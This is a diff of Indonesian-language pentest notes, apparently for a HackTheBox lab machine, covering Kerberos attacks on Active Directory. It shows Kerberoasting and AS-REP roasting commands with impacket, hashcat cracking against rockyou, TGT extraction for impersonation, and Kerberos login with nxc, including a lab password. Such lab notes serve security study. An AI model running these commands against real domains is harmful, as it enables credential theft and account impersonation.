@@ -1,27 +1,20 @@
 sistem autentikasi di windows AD tanpa harus mengirimkan password ke jaringan, tapi menggunakan sistem tiket.
 
-# 1. Kerberoasting Attack
+# Kerberoasting Attack
 ```shell
 impacket-GetUserSPNs logging.htb/'wallace.everette':'Welcome2026@' -dc-ip 10.129.245.130 -request -outputfile kerberoast_hashes.txt
 ```
 ![](Attachments/Pasted%20image%2020260616133752.png)
-# 2. AS-REP Roasting
+# AS-REP Roasting
 ```shell
 # menggunakan list user yang didapat dari rid brute pada enum smb sebelumnya, tidak perlu password
-impacket-GetNPUsers logging.htb/ -usersfile listuser.txt -no-pass -dc-ip 10.129.245.130 
+impacket-GetNPUsers logging.htb/ -usersfile users-clean.txt -no-pass -dc-ip 10.129.245.130
 
 #Jika dapat langsung crack
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
 
 ```
-# Download Kerberos configuration
-```shell
-nxc smb logging.htb --generate-krb5-file ./krb5.conf  
-  
-# Export configuration  
-export KRB5_CONFIG=./krb5.conf
-```
-# TGT
+# Download TGT
 Kalau kamu punya TGT seseorang → kamu bisa **impersonate** mereka tanpa tahu passwordnya!
 selalu gunakan impacket-getTGT untuk extract TGT nya.
 ```shell
@@ -37,3 +30,15 @@ export KRB5CCNAME=MS01\$.ccache
 get TGT and validation with klist 
 ![](Attachments/Pasted%20image%2020260616204625.png)
 
+# Login kerberos
+```shell
+xc smb 10.129.245.130 -u 'svc_recovery' -p '' -k --use-kcache
+```
+![](Attachments/Pasted%20image%2020260703150450.png)
+# Download Kerberos configuration
+```shell
+nxc smb logging.htb --generate-krb5-file ./krb5.conf  
+  
+# Export configuration  
+export KRB5_CONFIG=./krb5.conf
+```
